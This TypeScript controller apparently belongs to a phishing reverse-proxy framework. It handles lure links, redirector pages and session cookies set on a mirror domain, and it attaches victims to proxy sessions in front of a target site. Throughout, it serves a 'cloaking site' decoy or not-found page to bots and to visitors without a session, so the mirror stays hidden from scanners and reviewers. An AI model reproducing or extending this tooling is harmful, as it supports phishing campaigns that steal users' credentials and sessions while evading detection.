import { DIContainer } from '@famir/common'
import {
  EnabledFullTargetModel,
  FullCampaignModel,
  FullRedirectorModel,
  SessionModel
} from '@famir/database'
import {
  HTTP_SERVER_ROUTER,
  HttpServerContext,
  HttpServerError,
  HttpServerNextFunction,
  HttpServerRouter
} from '@famir/http-server'
import { HttpCookie } from '@famir/http-tools'
import { Logger, LOGGER } from '@famir/logger'
import { TEMPLATER, Templater } from '@famir/templater'
import { Validator, VALIDATOR } from '@famir/validator'
import {
  AUTH_SESSION_USE_CASE,
  type AuthSessionUseCase,
  CREATE_SESSION_USE_CASE,
  type CreateSessionUseCase,
  FIND_LURE_REDIRECTOR_USE_CASE,
  type FindLureRedirectorUseCase,
  READ_PROXY_USE_CASE,
  type ReadProxyUseCase,
  UPGRADE_SESSION_USE_CASE,
  type UpgradeSessionUseCase
} from '../../use-cases/index.js'
import { BaseController } from '../base/index.js'
import { LandingRedirectorData, LandingUpgradeData } from './authorize.js'
import { authorizeSchemas } from './authorize.schemas.js'

export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')

export class AuthorizeController extends BaseController {
  static inject(container: DIContainer) {
    container.registerSingleton(
      AUTHORIZE_CONTROLLER,
      (c) =>
        new AuthorizeController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<Templater>(TEMPLATER),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER),
          c.resolve<ReadProxyUseCase>(READ_PROXY_USE_CASE),
          c.resolve<FindLureRedirectorUseCase>(FIND_LURE_REDIRECTOR_USE_CASE),
          c.resolve<CreateSessionUseCase>(CREATE_SESSION_USE_CASE),
          c.resolve<AuthSessionUseCase>(AUTH_SESSION_USE_CASE),
          c.resolve<UpgradeSessionUseCase>(UPGRADE_SESSION_USE_CASE)
        )
    )
  }

  static resolve(container: DIContainer): AuthorizeController {
    return container.resolve(AUTHORIZE_CONTROLLER)
  }

  constructor(
    validator: Validator,
    logger: Logger,
    protected templater: Templater,
    router: HttpServerRouter,
    protected readonly readProxyUseCase: ReadProxyUseCase,
    protected readonly findLureRedirectorUseCase: FindLureRedirectorUseCase,
    protected readonly createSessionUseCase: CreateSessionUseCase,
    protected readonly authSessionUseCase: AuthSessionUseCase,
    protected readonly upgradeSessionUseCase: UpgradeSessionUseCase
  ) {
    super(validator, logger, router)

    this.validator.addSchemas(authorizeSchemas)

    this.logger.debug(`AuthorizeController initialized`)
  }

  use(): this {
    this.router.register('authorize', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (target.isLanding) {
        if (ctx.url.isPath(campaign.landingUpgradePath)) {
          if (ctx.method.is('GET')) {
            await this.landingUpgradeSession(ctx, campaign)
          } else {
            await this.sendNotFoundPage(ctx, target)
          }

          return
        }

        const lureRedirector = await this.findLureRedirectorUseCase.execute({
          campaignId: campaign.campaignId,
          path: ctx.url.get('pathname')
        })

        if (lureRedirector) {
          if (ctx.method.is(['GET', 'HEAD'])) {
            const [lure, redirector] = lureRedirector

            await this.landingRedirectorSession(ctx, campaign, target, redirector)
          } else {
            await this.sendNotFoundPage(ctx, target)
          }

          return
        }

        await this.landingAuthSession(ctx, campaign, target, next)
      } else {
        await this.transparentSession(ctx, campaign, target, next)
      }
    })

    return this
  }

  protected async landingUpgradeSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): Promise<void> {
    const landingUpgradeData = this.parseLandingUpgradeData(ctx)

    if (ctx.isBot) {
      await this.sendMainRedirect(ctx)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)
    if (!sessionCookie) {
      await this.sendMainRedirect(ctx)

      return
    }

    if (!this.checkSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendMainRedirect(ctx)

      return
    }

    const session = await this.authSessionUseCase.execute({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendMainRedirect(ctx)

      return
    }

    if (session.isLanding) {
      this.persistSessionCookie(ctx, campaign, session)

      await this.sendMainRedirect(ctx)

      return
    }

    await this.upgradeSessionUseCase.execute({
      campaignId: campaign.campaignId,
      lureId: landingUpgradeData.lure_id,
      sessionId: session.sessionId,
      secret: landingUpgradeData.secret
    })

    this.persistSessionCookie(ctx, campaign, session)

    await this.sendMainRedirect(ctx)
  }

  protected async landingRedirectorSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    redirector: FullRedirectorModel
  ): Promise<void> {
    const landingRedirectorData = this.parseLandingRedirectorData(ctx)

    if (ctx.isBot) {
      await this.sendRedirectorPage(ctx, campaign, target, redirector, landingRedirectorData)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (!sessionCookie) {
      const session = await this.createSessionUseCase.execute({
        campaignId: campaign.campaignId
      })

      this.persistSessionCookie(ctx, campaign, session)

      await this.sendOriginRedirect(ctx)

      return
    }

    if (!this.checkSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    const session = await this.authSessionUseCase.execute({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    this.persistSessionCookie(ctx, campaign, session)

    await this.sendRedirectorPage(ctx, campaign, target, redirector, landingRedirectorData)
  }

  protected async landingAuthSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    next: HttpServerNextFunction
  ): Promise<void> {
    if (ctx.isBot) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (!sessionCookie) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    if (!this.checkSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    const session = await this.authSessionUseCase.execute({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.sendOriginRedirect(ctx)

      return
    }

    this.persistSessionCookie(ctx, campaign, session)

    if (!session.isLanding) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    const proxy = await this.readProxyUseCase.execute({
      campaignId: campaign.campaignId,
      proxyId: session.proxyId
    })

    this.setState(ctx, 'proxy', proxy)
    this.setState(ctx, 'session', session)

    if (ctx.verbose) {
      ctx.responseHeaders.merge({
        'X-Famir-Session-Id': session.sessionId,
        'X-Famir-Proxy-Id': proxy.proxyId
      })
    }

    await next()
  }

  protected async transparentSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    next: HttpServerNextFunction
  ): Promise<void> {
    if (ctx.isBot) {
      await this.sendCloakingSite(ctx, target)

      return
    }

    let session: SessionModel | null = null

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (sessionCookie && this.checkSessionCookie(sessionCookie)) {
      session = await this.authSessionUseCase.execute({
        campaignId: campaign.campaignId,
        sessionId: sessionCookie
      })
    }

    if (!session) {
      session = await this.createSessionUseCase.execute({
        campaignId: campaign.campaignId
      })
    }

    this.persistSessionCookie(ctx, campaign, session)

    const proxy = await this.readProxyUseCase.execute({
      campaignId: campaign.campaignId,
      proxyId: session.proxyId
    })

    this.setState(ctx, 'proxy', proxy)
    this.setState(ctx, 'session', session)

    if (ctx.verbose) {
      ctx.responseHeaders.merge({
        'X-Famir-Session-Id': session.sessionId,
        'X-Famir-Proxy-Id': proxy.proxyId
      })
    }

    await next()
  }

  private lookupSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): HttpCookie | undefined {
    const cookies = ctx.requestHeaders.getCookies()

    return cookies ? cookies[campaign.sessionCookieName] : undefined
  }

  private checkSessionCookie(value: unknown): value is string {
    return this.validator.guardSchema<string>('reverse-proxy-session-cookie', value)
  }

  private persistSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    session: SessionModel
  ) {
    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: session.sessionId,
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: Math.round(campaign.sessionExpire / 1000)
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  private removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: '',
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: 0
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  private parseLandingUpgradeData(ctx: HttpServerContext): LandingUpgradeData {
    try {
      const queryString = ctx.url.getQueryString()
      const value = Object.values(queryString)[0]

      if (!(value && typeof value === 'string')) {
        throw new Error(`QueryString value is not a string`)
      }

      const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())

      this.validator.assertSchema<LandingUpgradeData>('reverse-proxy-landing-upgrade-data', data)

      return data
    } catch (error) {
      throw new HttpServerError(`Bad request`, {
        cause: error,
        context: {
          reason: `Parse landing upgrade data failed`
        },
        code: 'BAD_REQUEST'
      })
    }
  }

  private parseLandingRedirectorData(ctx: HttpServerContext): LandingRedirectorData {
    try {
      const queryString = ctx.url.getQueryString()
      const value = Object.values(queryString)[0]

      if (!(value && typeof value === 'string')) {
        throw new Error(`QueryString value is not a string`)
      }

      const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())

      this.validator.assertSchema<LandingRedirectorData>(
        'reverse-proxy-landing-redirector-data',
        data
      )

      return data
    } catch (error) {
      throw new HttpServerError(`Bad request`, {
        cause: error,
        context: {
          reason: `Parse landing redirector data failed`
        },
        code: 'BAD_REQUEST'
      })
    }
  }

  protected async sendCloakingSite(
    ctx: HttpServerContext,
    target: EnabledFullTargetModel
  ): Promise<void> {
    if (ctx.url.isPath('/')) {
      await this.sendMainPage(ctx, target)
    } else {
      await this.sendNotFoundPage(ctx, target)
    }
  }

  protected async sendRedirectorPage(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    redirector: FullRedirectorModel,
    landingRedirectorData: LandingRedirectorData
  ): Promise<void> {
    if (ctx.method.is(['GET', 'HEAD'])) {
      ctx.status.set(200)

      const text = this.templater.render(redirector.page, landingRedirectorData)
      ctx.responseBody.setText(text)

      ctx.responseHeaders.merge({
        'Content-Type': 'text/html',
        'Content-Length': ctx.responseBody.length.toString(),
        'Last-Modified': redirector.updatedAt.toUTCString(),
        'Cache-Control': 'public, max-age=86400'
      })

      if (ctx.method.is('HEAD')) {
        ctx.responseBody.reset()
      }

      await ctx.sendResponse()
    } else {
      await this.sendNotFoundPage(ctx, target)
    }
  }
}
